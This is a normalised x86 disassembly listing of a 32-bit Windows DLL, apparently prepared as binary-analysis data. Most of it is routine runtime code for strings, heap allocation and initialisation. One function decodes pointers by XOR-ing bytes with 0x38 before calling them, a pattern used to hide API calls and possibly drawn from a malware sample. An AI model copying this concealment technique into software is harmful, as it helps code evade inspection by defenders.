mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
sar edi 0x1
push edi
push esi
mov ecx esi
call sub_1005c9a6
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push ebx
lea ebx [ edi + edi ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
sub_10040e6d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1005bb5a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10040ea0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080878
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x34 ] eax
mov ebx ecx
mov [ ebp - 0x30 ] edi
cmp eax edi
je r-xdata
push edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] edi
push r--data
mov ecx esi
mov [ esi ] 0x0
call sub_10043190
cmp ebx edi
je r-xdata
push edi
push edi
push edi
push edi
push ebx
push eax
push edi
push edi
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x30 ] eax
cmp eax edi
je r-xdata
inc eax
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0x34 ]
push 0x0
push 0x0
mov edi eax
mov eax [ ebp - 0x30 ]
push eax
push edi
push ebx
push ecx
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
call sub_10043190
xor ebx ebx
push edi
push ebx
mov [ ebp - 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_1000adb0
lea ecx [ ebp - 0x2c ]
call sub_10061060
jmp r-xdata
push edi
push eax
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push r--data
mov ecx esi
call sub_10001460
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10040fe0
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov edx [ ecx + 0x20 ]
sub edx [ ecx + 0x1c ]
mov eax 0x38e38e39
imul edx
sar edx 0x3
push esi
mov eax edx
shr eax 0x1f
push edi
mov edi [ ecx + 0x1c ]
mov ecx [ ecx + 0x20 ]
lea esi [ edx + eax - 0x1 ]
sub ecx edi
mov eax 0x38e38e39
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add ecx edx
cmp ecx esi
ja r-xdata
lea edx [ esi + esi * 8 ]
mov eax [ edi + edx * 4 + 0x1c ]
lea esi [ edi + edx * 4 + 0x1c ]
mov edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
push r--data
call sub_10050437
mov ecx [ esi + 0x4 ]
add ecx edi
push ecx
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push edi
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ esi ] eax
mov eax [ esi + 0x4 ]
add eax [ esi ]
push edi
push edx
push eax
call sub_100796a0
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10041090
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
push edi
call sub_100732e0
inc [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x10 ]
mov ecx [ esi ]
sub eax edi
lea edx [ eax * 4 - 0x4 ]
lea ecx [ ecx + edi * 4 ]
push edx
push ecx
add ecx 0x4
push ecx
call sub_10078db0
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
add esp 0xc
mov [ eax + edi * 4 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100410d3
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_10041715
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_10001460
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_10041110
push ebp
mov ebp esp
push 0xffffffff
push sub_10080878
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
mov edi ecx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_10043190
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
push ecx
push ebx
mov eax edi
mov [ ebp - 0x4 ] ebx
call sub_10028980
add esp 0xc
cmp eax 0xffffffd6
jne r-xdata
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push r--data
mov ecx esi
mov [ esi ] bl
call sub_10043190
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
push eax
call sub_10035b61
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x34 ]
push ecx
mov [ ebp - 0x30 ] eax
push eax
mov eax edi
call sub_10028980
mov edi [ ebp - 0x30 ]
add esp 0x10
test eax eax
jne r-xdata
push edi
call sub_1005cc3f
add esp 0x4
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_1000adb0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov eax [ ebp - 0x2c ]
push eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_10043190
call sub_1006591f
add esp 0x4
sub_10041240
push ebp
mov ebp esp
push 0xffffffff
push sub_10080df2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ edi + 0x4 ]
cmp esi ecx
jae r-xdata
cmp ecx [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
cmp eax esi
ja r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
xor edx edx
mov [ ebp - 0x4 ] 0x1
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10036cc0
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ edi + 0x8 ]
jne r-xdata
add [ edi + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push esi
mov ecx [ edi ]
lea eax [ esi * 8 ]
sub eax esi
lea eax [ ecx + eax * 4 ]
mov ecx [ edi + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
xor edx edx
mov [ ebp - 0x4 ] edx
cmp ecx edx
je r-xdata
push 0x1
mov ecx edi
call sub_10036cc0
push eax
jmp r-xdata
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] edx
mov [ ecx ] dl
call sub_1000adb0
sub_10041310
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x40
mov ecx [ ebp + 0x8 ]
mov dl [ ebp + 0xc ]
mov [ esp + 0x14 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ esp + 0x18 ] dl
mov edx [ ebp + 0x14 ]
mov [ esp + 0x1c ] ecx
mov ecx [ ebp + 0x18 ]
mov [ esp + 0x20 ] edx
mov edx [ ebp + 0x1c ]
mov [ esp + 0x24 ] ecx
mov ecx [ ebp + 0x20 ]
push ebx
mov [ esp + 0x2c ] edx
mov edx [ ebp + 0x24 ]
mov [ esp + 0x30 ] ecx
mov ecx [ ebp + 0x28 ]
push esi
xor eax eax
mov [ esp + 0x38 ] edx
mov edx [ ebp + 0x2c ]
mov [ esp + 0x3c ] ecx
mov ecx [ ebp + 0x30 ]
mov bl 0x38
push eax
mov [ esp + 0x44 ] edx
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov [ esp + 0x48 ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] ecx
mov ecx [ esp + 0xc ]
xor [ esp + 0x10 ] bl
xor [ esp + 0x11 ] bl
xor [ esp + 0x12 ] bl
xor [ esp + 0x13 ] bl
push eax
lea edx [ esp + 0x18 ]
push edx
push ecx
push eax
push eax
mov [ esp + 0x28 ] 0x9
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
call [ esp + 0x24 ]
mov edx [ rw-data ]
mov [ esp + 0xc ] edx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
mov esi eax
push 0xffffffff
push esi
call [ esp + 0x14 ]
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push esi
call [ esp + 0x10 ]
mov ecx [ rw-data ]
mov edx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
xor [ esp + 0xc ] bl
xor [ esp + 0xd ] bl
xor [ esp + 0xe ] bl
xor [ esp + 0xf ] bl
push edx
call [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x2c
sub_10041440
push ebp
mov ebp esp
push 0xffffffff
push sub_100837bb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0xc4 ] eax
mov [ ebp - 0xc0 ] ecx
call sub_10046b90
xor ecx ecx
cmp eax ecx
je r-xdata
xor edx edx
mov [ ebp - 0xa8 ] 0x7
mov [ ebp - 0xac ] ecx
mov [ ebp - 0xbc ] dx
mov [ ebp - 0x4 ] ecx
lea ebx [ ebp - 0xbc ]
mov ecx esi
call sub_10005590
test eax eax
je r-xdata
lea edx [ ebp - 0xa0 ]
lea eax [ ecx + 0x73 ]
call sub_10013830
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc4 ]
push ecx
mov ecx [ ebp - 0xc0 ]
mov ebx edi
lea edx [ ebp - 0xbc ]
call sub_1005a080
test eax eax
je r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x8f
call sub_10013830
cmp [ ebp - 0xa8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0xa8 ] 0x8
jb r-xdata
lea edx [ ebp - 0x98 ]
mov eax 0x1c
call sub_10013830
cmp [ ebp - 0xa8 ] 0x8
jb r-xdata
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
mov eax [ ebp - 0xbc ]
push eax
call sub_1006591f
add esp 0x4
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0xbc ]
push edx
call sub_1006591f
add esp 0x4
sub_1004157e
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1007db79
pop edi
pop ebp
retn
sub_1004159d
push 0x4c
mov eax sub_1007f9ce
call sub_1001bb6b
mov edi [ ebp + 0x8 ]
and [ ebp - 0x30 ] 0x0
mov ebx [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
inc eax
call sub_1004fa89
retn
cmp [ edi ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x34 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_10034337
cmp [ eax + 0x14 ] 0x10
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] 0x1
jb r-xdata
test [ ebp - 0x30 ] 0x1
je r-xdata
and [ ebp - 0x30 ] 0xfffffffd
lea ecx [ ebp - 0x58 ]
call sub_10039680
push eax
lea ecx [ ebp - 0x58 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x30 ] 0x3
mov [ esi ] r--data
call sub_10062816
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov eax [ eax ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10041a20
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x30 ] al
je r-xdata
sub_10041660
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push 0xa
push eax
call sub_10020380
mov ecx [ ebp + 0xc ]
add esp 0x8
mov [ ecx ] eax
mov [ ecx + 0x4 ] 0x0
mov [ ecx + 0x8 ] 0xa
pop ebp
retn
sub_10041686
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x14 ] ecx
call sub_100177a8
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp + 0x10 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x10
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_100796a0
add esp 0xc
add [ esi ] ebx
sub_10041715
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_100049c2
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_10036443
push eax
push edi
push esi
call sub_1006605f
add esp 0x10
test eax eax
jne r-xdata
push 0x1
push edi
call sub_1000977c
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100492ed
int3
mov eax esi
jmp r-xdata
mov eax r--data
pop edi
sub_1004177f
mov edi edi
push ebp
mov ebp esp
jmp r-xdata
cmp [ ebp + 0x18 ] 0x0
ja r-xdata
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10044159
dec [ ebp + 0x18 ]
add [ ebp + 0x14 ] 0x2
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
sub_100417c0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_10050437
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_1002b580
push ebx
push 0x0
mov ecx esi
call sub_1002b580
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_10016d10
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_100418b0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10019f50
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_100418e0
push ebp
mov ebp esp
sub esp 0x70
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x30 ]
push ebx
mov [ ebp - 0x70 ] ecx
lea ecx [ ebp - 0x60 ]
push ecx
xor ebx ebx
push eax
mov [ ebp - 0x60 ] ebx
call edx
test eax eax
jns r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x6c ]
mov [ ebp - 0x6c ] ebx
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x20 ]
call eax
mov eax [ ebp - 0x6c ]
cmp eax ebx
jne r-xdata
lea eax [ ebx + 0x1 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push edi
xor edi edi
cmp eax ebx
jle r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x127
call sub_100050e0
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x60 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
push esi
lea edx [ ebp - 0x38 ]
mov eax 0xd2
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x68 ] ebx
call sub_1000a810
test eax eax
je r-xdata
inc edi
cmp edi [ ebp - 0x6c ]
jl r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov esi [ ebp - 0x68 ]
mov eax [ ebp - 0x70 ]
push esi
add eax 0x54
call sub_10007a30
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x68 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x60 ]
lea edx [ ebp - 0x64 ]
push edx
mov [ ebp - 0x64 ] ebx
mov ecx [ eax ]
push edi
push eax
mov eax [ ecx + 0x1c ]
call eax
mov ecx [ ebp - 0x64 ]
cmp ecx ebx
je r-xdata
pop esi
mov eax [ ebp - 0x64 ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0xa
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
call sub_100050e0
sub_10041a20
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_1006591f
add esp 0x4
pop ebx
push edi
push ebx
push esi
call sub_100796a0
add esp 0xc
sub_10041a66
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
pop ecx
sub_10041a88
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1002ada5
and [ eax ] 0x0
call sub_1004fd6f
mov [ eax ] 0x9
call sub_1001d849
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_10041b00
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push esi
push edi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_100595ad
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_10041b5a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
[ edi ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp ecx eax
ja r-xdata
test esi esi
jne r-xdata
pop edi
leave
retn
push [ ebp + 0x18 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x14 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call sub_10028f80
add esp 0x10
mov edi eax
test esi esi
je r-xdata
mov [ ebp - 0x1c ] ecx
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
pop esi
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_1006b64d
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax edi
sub_10041c10
cmp [ rw-data ] 0x8
jb r-xdata
push esi
xor ecx ecx
mov esi rw-data
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
call sub_10059ff0
mov esi 0x8
cmp [ rw-data ] esi
jb r-xdata
mov eax [ rw-data ]
push eax
call sub_1006591f
add esp 0x4
xor eax eax
cmp [ rw-data ] esi
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] ax
pop esi
jb r-xdata
mov edx [ rw-data ]
push edx
call sub_1006591f
add esp 0x4
xor edx edx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] dx
retn
mov ecx [ rw-data ]
push ecx
call sub_1006591f
add esp 0x4
sub_10041cc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081af6
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor esi esi
mov [ ebp - 0x10 ] rw-data
mov [ rw-data ] r--data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ ebp - 0x4 ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ ebp - 0x4 ] 0x1
push esi
xor eax eax
push r--data
mov ecx rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] 0x7
mov [ rw-data ] esi
mov [ rw-data ] ax
call sub_100531b0
push rw-data
mov [ rw-data ] esi
mov [ rw-data ] esi
mov [ rw-data ] esi
call [ InitializeCriticalSection@IAT ]
mov eax rw-data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10041d8e
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_1006b5ae
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_10041dbf
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1007ac73
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10041e05
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x18 ]
xor ebx ebx
call sub_1006a508
mov eax [ ebp - 0x18 ]
mov edi [ eax + 0xd4 ]
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x4 ]
push [ edi + esi * 4 + 0x1c ]
call sub_10079b60
push [ edi + esi * 4 ]
mov [ ebp - 0x8 ] eax
call sub_10079b60
add eax ebx
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x7
pop ecx
pop ecx
mov ecx [ ebp - 0x8 ]
lea ebx [ eax + ecx + 0x2 ]
jb r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10008102
mov esi eax
pop ecx
mov [ ebp - 0x8 ] esi
test esi esi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x8 ]
leave
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
int3
push esi
call sub_10079b60
add esi eax
mov eax [ ebp - 0x4 ]
mov [ esi ] 0x3a
push [ edi + eax * 4 + 0x1c ]
mov eax [ ebp - 0x8 ]
inc esi
sub eax esi
lea eax [ eax + ebx + 0x1 ]
push eax
push esi
